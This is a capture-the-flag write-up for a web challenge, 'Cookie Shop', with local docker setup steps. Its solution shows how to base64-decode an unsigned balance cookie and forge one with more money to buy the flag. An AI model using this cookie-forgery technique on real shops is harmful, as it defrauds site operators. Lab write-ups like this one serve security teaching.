# Cookie Shop
<b>Author</b>: [meni](https://github.com/menitz/)<br>
<b>Category</b>: web <br>
<b>Solves</b>: 133<br>

## Descritpion
Our cookies are baked fresh with love and a dash of indulgence, crafted to melt in your mouth and make your day just a bit sweeter.

## How to run the server
To run the server you need [`docker`](https://docs.docker.com/get-started/get-docker/) installed. <br>
Then you can navigate to the `src` folder and run the command `docker compose up --build -d`. <br>
Now you can connect to the server by opening [`http://localhost:5002/`](http://localhost:5002/) in your browser. <br>
To shut down the server run the command `docker compose down`.

## Solution
To buy the flag, we need more money than what is available in our balance.

Looking at the cookies, as suggested by the shop's name, we find only a cookie named "nothing". We try to decode it usi:ng a base64 decoder:
```bash
$ echo "eyJiYWxhbmNlIjogMTB9" | base64 --decode
{'balance': 10}
```
We can create a cookie with enough money to buy the flag:
```bash
$ echo '{"balance":1000}' | base64
```
By replacing the provided cookie with the original one, we can buy the flag which will be printed.



